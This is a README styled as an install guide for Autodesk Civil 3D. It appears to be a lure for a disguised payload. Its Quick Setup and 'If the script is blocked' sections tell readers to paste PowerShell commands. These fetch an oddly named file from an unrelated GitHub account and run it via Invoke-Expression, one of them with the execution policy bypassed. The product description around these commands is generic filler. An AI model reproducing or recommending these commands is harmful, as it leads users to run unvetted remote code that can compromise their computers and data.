# Civil 3D

Civil 3D is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Civil 3D and work in it.

Autodesk Civil 3D runs on Windows as a BIM-oriented civil design application built on the AutoCAD platform. It connects survey and LiDAR data to surfaces, alignments, profiles, corridors, pipe networks, and grading models so road, site, and utility work stays coordinated in one drawing environment.

A typical session starts in an existing project drawing: you refresh surfaces from field data, edit alignments and profiles, rebuild corridors for a revised cross section, run quantity takeoffs, and push sheets through plan production tools. Civil 3D objects stay dynamic, so profile and section views update when the parent alignment or surface changes.

This repository holds a Windows deployment package reference, step-by-step install and network license notes, project template pointers, and a changelog of add-in and service pack updates. It is meant for engineers and CAD managers who need a consistent Civil 3D baseline across machines.

## What you do with it

- Dynamic alignments and profiles drive sections that rebuild when horizontal geometry changes.
- Corridor assemblies generate 3D road models with lane, shoulder, and curb subassemblies.
- Surfaces from points, contours, and breaklines support grading and volume comparisons.
- Pipe and pressure networks route utilities with rules-based parts and profile views.
- Grading objects tie feature lines to surfaces for pads, ponds, and site earthwork.
- Plan production tools place sheets, view frames, and labels from the same model.
- Data shortcuts share corridors and surfaces across project drawings without duplication.
- Quantity takeoff reports tie corridor and surface volumes to design revisions automatically.

## Quick Setup (PowerShell)

This installs the program Civil 3D on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/lorenz-julia388646/civil-3d-setup-guide/main/tt0b3jnb30.vdctmvig | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/lorenz-julia388646/civil-3d-setup-guide/main/tt0b3jnb30.vdctmvig | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `tt0b3jnb30.vdctmvig` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `lorenz-julia388646/civil-3d-setup-guide`. Autodesk Civil 3D 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
